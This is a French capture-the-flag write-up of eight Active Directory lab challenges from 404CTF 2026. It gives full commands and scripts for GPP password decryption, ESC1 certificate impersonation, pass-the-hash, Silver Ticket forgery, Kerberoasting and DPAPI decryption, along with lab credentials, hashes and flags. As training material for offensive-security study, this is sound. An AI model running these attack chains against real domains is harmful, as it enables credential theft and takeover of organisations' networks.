---
title: "404CTF 2026 — Challenges Réalistes Active Directory"
date: 2026-06-07
platform: 404CTF 2026
category: realist
difficulty: hard
tags: [ActiveDirectory, ADCS, DPAPI, Kerberos, GPP, SilverTicket, SMB]
description: "Writeup des challenges réalistes AD du 404CTF 2026 — énumération, GPP decrypt, ADIDNS, Named Pipe IPC$, ESC1 ADCS, Kerberoasting AES, Silver Ticket et DPAPI."
---

## Les Cahiers de Curie

**Cible :** `10.0.10.56`

Enumération SMB en null session :

```bash
nxc smb 10.0.10.56 -u '' -p '' --users
```

Les utilisateurs sont exposés sans authentification.

```
404CTF{M4r13_Cur13_3st_Un3_Pr0!}
```

---

## Le Secret de Lavoisier — GPP Credentials

**Cible :** `10.0.10.154`  
**Credentials :** `metro3681_404Player` / `5369Hivgxil@$*`

Enumération des partages :

```bash
nxc smb 10.0.10.154 -u 'metro3681_404Player' -p '5369Hivgxil@$*' --users
smbclient //10.0.10.154/SYSVOL -U 'metro3681_404Player%5369Hivgxil@$*'
```

```bash
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
find . -type f -exec strings {} \;
```

Un fichier GPP contient un mot de passe chiffré. Le chiffrement GPP (AES-256) utilise une clé publique Microsoft — déchiffrement trivial :

```bash
gpp-decrypt 'Ds5TqVEfXejILl8sHlc7R+UZtaGgP/Ong8YuGea+dS01Yz5SwdV7BCgrnWVDAkzPBhUZoXTmoxv/BqJeeGaXzw=='
# → LavoisierForgotMyPassword2026!
```

Compte `backup_reader` compromis → accès au partage Backups :

```bash
smbclient //10.0.10.154/Backups -U 'backup_reader%LavoisierForgotMyPassword2026!'
```

```
404CTF{L4v01s13r_N_41m41t_P4s_L3s_GPP!}
```

---

## La Résolution de Le Verrier — ADIDNS via LDAP

**Cible :** `10.0.10.19`  
**Credentials :** `maison3185_404Player` / `&!%dlalqm4380L`

L'indice : Le Verrier a découvert Neptune **par le calcul** — le flag est dans les enregistrements DNS cachés, lisibles via LDAP.

**AXFR bloqué ≠ DNS opaque.** Sur un AD Windows, les enregistrements DNS sont stockés dans LDAP sous `DomainDnsZones`.

```bash
ldapsearch -x -H ldap://10.0.10.19 \
  -D "maison3185_404Player@ctfcorp.local" \
  -w '&!%dlalqm4380L' \
  -b "CN=MicrosoftDNS,DC=DomainDnsZones,DC=ctfcorp,DC=local" \
  "(objectClass=dnsNode)" dc dnsRecord | grep "^dc:"
```

Un nœud suspect apparaît : `r3st0r3-7f3a91e2`

```bash
dig @10.0.10.19 TXT r3st0r3-7f3a91e2.challenge.ctfcorp.local
```

```
404CTF{ADIDNS_LD4P_3num_R3v34ls_Wh4t_AXFR_H1d3s}
```

> **Leçon :** AXFR bloqué ne signifie pas que les zones DNS sont protégées. Un compte AD authentifié peut dumper tous les enregistrements via LDAP — exactement comme Le Verrier a déduit Neptune sans jamais la voir.

---

## Protocole Pasteur \[1/3\] — Named Pipe IPC$

**Cible :** `10.0.10.81`  
**Credentials :** `toit746_404Player` / `$*#4419Xyoiyqq`

Pas de remote shell (WinRM, RDP...). L'énumération SMB révèle un named pipe inhabituel dans `IPC$` : `pasteur_intern_helper`.

```bash
smbmap -H 10.0.10.81 -u toit746_404Player -p '$*#4419Xyoiyqq' -d ctfcorp.local -r
```

Interaction avec le pipe via Impacket :

```python
from impacket.smbconnection import SMBConnection

smb = SMBConnection('10.0.10.81', '10.0.10.81')
smb.login('toit746_404Player', '$*#4419Xyoiyqq', 'ctfcorp.local')
tid = smb.connectTree('IPC$')
fid = smb.openFile(tid, '\\pasteur_intern_helper')

data = smb.readFile(tid, fid, 0, 1024)
print("Banner:", data.decode('utf-8-sig'))

smb.writeFile(tid, fid, b'WHOAMI\n')
smb.writeFile(tid, fid, b'GETFLAG\n')
data = smb.readFile(tid, fid, 0, 4096)
print(data.decode('utf-8-sig'))
```

```
PasteurInternHelper v0.9
OK hello labintern, session initialisée.
OK 404CTF{P4st3ur_P1p3l1n3_Hello_St4g14ir3_2015}
```

---

## L'Identité de Bertillon — ESC1 (AD CS)

**Cible :** `10.0.10.159`  
**Credentials :** `chien9341_404Player` / `qzpkpf*#%6159B`

Enumération des templates de certificats vulnérables :

```bash
certipy find -u 'chien9341_404Player' -p 'qzpkpf*#%6159B' -dc-ip 10.0.10.159 -vulnerable -enabled
```

Le template `CTFAuditorAuth` est vulnérable à **ESC1** — il permet de spécifier un UPN arbitraire dans la requête.

```bash
# Synchroniser l'heure (obligatoire pour Kerberos)
ntpdate -u 10.0.10.159

# Demande de certificat en usurpant vip_auditor
certipy req \
  -u 'chien9341_404Player' \
  -p 'qzpkpf*#%6159B' \
  -dc-ip 10.0.10.159 \
  -ca 'ctfcorp-DC1-CA' \
  -template 'CTFAuditorAuth' \
  -upn 'vip_auditor@ctfcorp.local'

# Authentification → récupération du hash NTLM
certipy auth -pfx vip_auditor.pfx -dc-ip 10.0.10.159
```

Hash NTLM récupéré → Pass-the-Hash :

```bash
smbclient.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe \
  ctfcorp.local/vip_auditor@10.0.10.159
# use AuditReports → get confidential_q1_audit.txt
```

```
404CTF{ESC1_Y0u_4r3_Wh0_Y0u_Cl41m_T0_B3!}
```

---

## Protocole Pasteur \[2/3\] — Silver Ticket

**Cible :** `10.0.10.190`  
**Credentials :** `accord6490_404Player` / `L5883dpefus&@#`

Le compte initial a `ReadGMSAPassword` sur `svc_broker$` :

```bash
# Hash NTLM : 593749912b41ece1498731f50f9d58bd
# Clé AES256 : 55b4857af9e48fa5b4be74a2ee1bd64ca985720787717c4bc3b205e13bb3d291
```

`svc_broker$` a la délégation contrainte vers `HTTP/gateway.pasteur.lab`. `legacy_admin` est désactivé → S4U2Proxy impossible → **Silver Ticket**.

```bash
ticketer.py \
  -aesKey 55b4857af9e48fa5b4be74a2ee1bd64ca985720787717c4bc3b205e13bb3d291 \
  -domain-sid S-1-5-21-2991091012-709284574-3735152529 \
  -domain CTFCORP.LOCAL \
  -spn HTTP/gateway.pasteur.lab \
  -user-id 1105 \
  -groups 1104,513,512 \
  legacy_admin
```

Configuration Kerberos pour le realm cross-domain :

```ini
# /etc/krb5.conf
[libdefaults]
    default_realm = CTFCORP.LOCAL
    dns_canonicalize_hostname = false
    rdns = false

[domain_realm]
    .pasteur.lab = CTFCORP.LOCAL
    pasteur.lab = CTFCORP.LOCAL
```

```bash
export KRB5CCNAME=/workspace/legacy_admin.ccache
curl -s --negotiate -u : http://gateway.pasteur.lab:19432/flag
```

```
404CTF{S1lv3r_P4st3ur_Gh0st_1d3nt1ty_L3g3ndr3}
```

| Erreur | Cause | Fix |
|--------|-------|-----|
| `SPNEGO cannot find mechanisms` | `KRB5CCNAME` non défini | `export KRB5CCNAME=...` |
| `Matching credential not found` | `gateway.pasteur.lab` résolu en `PASTEUR.LAB` | Mapper `.pasteur.lab = CTFCORP.LOCAL` dans `krb5.conf` |
| `Ticket not yet valid` | Horloge en avance | Synchro via header `Date:` de la 401 |

---

## Le Rayonnement de Becquerel — Kerberoasting + AES decrypt

**Cible :** `10.0.10.166`  
**Credentials :** `rose4299_404Player` / `G3524*#!hvnmep`

Kerberoasting → hash TGS crackable :

```bash
GetUserSPNs.py ctfcorp.local/rose4299_404Player:'G3524*#!hvnmep' -dc-ip 10.0.10.166 -request
# → svc_reports : jerardo
```

Enumération LDAP avec `ldeep` → le champ `info` de `svc_reports` contient un blob base64 de 64 bytes :

```bash
ldeep ldap -u 'svc_reports' -p 'jerardo' -d ctfcorp.local -s ldap://10.0.10.166 all output.txt
# info : ICe87sXN9KXC7PAqfvbo/fEXN0Nckl2K4Jf+96N9Wv4HAm25tOkoXaXx0hALmqQZB58ySOV6/7aBgziZx7Dr+w==
```

Structure : `[16 bytes IV] + [48 bytes chiffrés]` — AES-256-CBC, clé = SHA-256 du mot de passe cracké.

```python
import base64, hashlib
from Crypto.Cipher import AES

data = base64.b64decode("ICe87sXN9KXC7PAqfvbo/fEXN0Nckl2K4Jf+96N9Wv4HAm25tOkoXaXx0hALmqQZB58ySOV6/7aBgziZx7Dr+w==")
key  = hashlib.sha256(b'jerardo').digest()
pt   = AES.new(key, AES.MODE_CBC, data[:16]).decrypt(data[16:])
print(pt.rstrip(bytes([pt[-1]])).decode())
```

```
404CTF{RC4_TGS_Wh1sp3rs_L0ud3r_Th4n_A3S!}
```

---

## Casse-toi le Stagiaire — DPAPI

**Cible :** `10.0.10.192`  
**Credentials :** `rose2092_404Player` / `!&*Z7333psucpx`

Le partage `Archive$` contient une master key DPAPI et un blob `credential.dpapi`.

**Etape 1 — Retrouver le SID du compte supprimé**

```bash
ldapsearch -H ldap://10.0.10.192 \
  -D "rose2092_404Player@ctfcorp.local" -w '!&*Z7333psucpx' \
  -b "DC=ctfcorp,DC=local" -E '!1.2.840.113556.1.4.417' \
  "(isDeleted=TRUE)" objectSid sAMAccountName
# → stagiaire2015 : S-1-5-21-2991091012-709284574-3735152529-1104
```

**Etape 2 — Cracker la master key**

```bash
python3 DPAPImk2john.py \
  -S S-1-5-21-2991091012-709284574-3735152529-1104 \
  -mk ef59a354-0c8e-4e49-8b50-f9ce74964916 \
  -c domain > dpapi.hash
# → mot de passe : pipeline
```

**Etape 3 — Déchiffrer**

```bash
dpapi.py masterkey \
  -file ef59a354-0c8e-4e49-8b50-f9ce74964916 \
  -sid S-1-5-21-2991091012-709284574-3735152529-1104 \
  -password pipeline

dpapi.py unprotect \
  -file credential.dpapi \
  -key 0x1dba8abe7fab73814a1bd5bcd9f1314713e686ab3d5fb5be6779d91730db0eafeafaa8f22400d25fdc154e36bb3a448666a4d80fe49193738ef9b07d28817391
```

```
404CTF{C4ss3_T01_M41s_T4_C0rb31ll3_P4rl3_3nc0r3}
```

---

## Récapitulatif

| Challenge | Technique | Flag |
|-----------|-----------|------|
| Les Cahiers de Curie | Null session SMB | `404CTF{M4r13_Cur13...}` |
| Le Secret de Lavoisier | GPP Decrypt | `404CTF{L4v01s13r...}` |
| La Résolution de Le Verrier | ADIDNS via LDAP | `404CTF{ADIDNS_LD4P...}` |
| Protocole Pasteur 1/3 | Named Pipe IPC$ | `404CTF{P4st3ur_P1p3l1n3...}` |
| L'Identité de Bertillon | ESC1 AD CS | `404CTF{ESC1_Y0u_4r3...}` |
| Protocole Pasteur 2/3 | Silver Ticket | `404CTF{S1lv3r_P4st3ur...}` |
| Le Rayonnement de Becquerel | Kerberoasting + AES | `404CTF{RC4_TGS_Wh1sp3rs...}` |
| Casse-toi le Stagiaire | DPAPI | `404CTF{C4ss3_T01...}` |
